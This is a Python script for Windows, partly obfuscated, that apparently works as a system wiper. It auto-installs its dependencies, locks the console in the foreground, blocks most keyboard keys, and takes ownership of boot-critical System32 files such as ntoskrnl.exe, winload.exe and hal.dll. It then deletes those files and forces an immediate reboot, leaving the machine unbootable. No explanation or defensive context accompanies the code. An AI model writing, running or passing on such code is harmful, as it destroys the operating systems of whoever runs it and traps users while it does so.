import subprocess
import importlib
import sys

required_modules = ['keyboard', 'pywin32']

def install_missing_modules(modules):
    try:
        pip = 'pip'
        importlib.import_module(pip)
    except ImportError:
        print(f"{pip} is not installed. Installing...")
        subprocess.check_call([sys.executable, "-m", "ensurepip", "--upgrade"])
    for module in modules:
        try:
            importlib.import_module(module)
        except ImportError:
            print(f"{module} is not installed. Installing...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", module])

install_missing_modules(required_modules)

J=Exception;F=range;C=True
import os as A,subprocess as D,getpass as K,keyboard as B,time,ctypes as L,win32gui as E,win32con as M,win32api,threading as N
from concurrent.futures import ThreadPoolExecutor as O,as_completed as P
Q={'ntoskrnl.exe','winload.exe','winload.efi','hal.dll','smss.exe'};G='C:\\Windows\\System32';R=K.getuser()
def S():
	try:
		A=L.windll.kernel32.GetConsoleWindow()
		if E.GetForegroundWindow()!=A:E.ShowWindow(A,M.SW_SHOW);E.SetForegroundWindow(A)
	except:pass
N.Thread(target=lambda:[S()or time.sleep(.1)for A in iter(int,1)],daemon=C).start()
def H(cmd):D.run(cmd,stdout=D.DEVNULL,stderr=D.DEVNULL,shell=C)
def T(path):
	A=path
	try:H(['takeown','/F',A,'/A']);H(['icacls',A,'/grant',f"{R}:F"]);return f"[OK] {A}"
	except J as B:return f"[ERROR] {A}: {B}"
def I(directory):return[A.path.join(C,B)for(C,E,D)in A.walk(directory)for B in D if B in Q]
def U():
	for B in I(G):
		try:A.remove(B)if A.path.exists(B)else None
		except J as C:print(f"Failed to delete {B}: {C}")
def V():
	A=I(G)
	with O(max_workers=min(200,len(A)))as B:
		for C in P([B.submit(T,A)for A in A]):C.result()
W=[f"f{A}"for A in F(1,13)]+['shift','ctrl','alt','cmd','caps_lock','tab','esc','menu','delete','end','down','page_down','left','right','home','up','page_up','insert','print_screen','-','=','`','*','/',';',"'",',','.','[',']']+[str(A)for A in F(10)]
def X(state=C):
	for A in W:(B.block_key if state else B.unblock_key)(A)
def Y():V();U();A.system('shutdown /r /t 0')
if __name__=='__main__':
	B.press_and_release('f11')
	for Z in F(14):B.press_and_release('ctrl+add')
	X(C);A.system('cls');Y()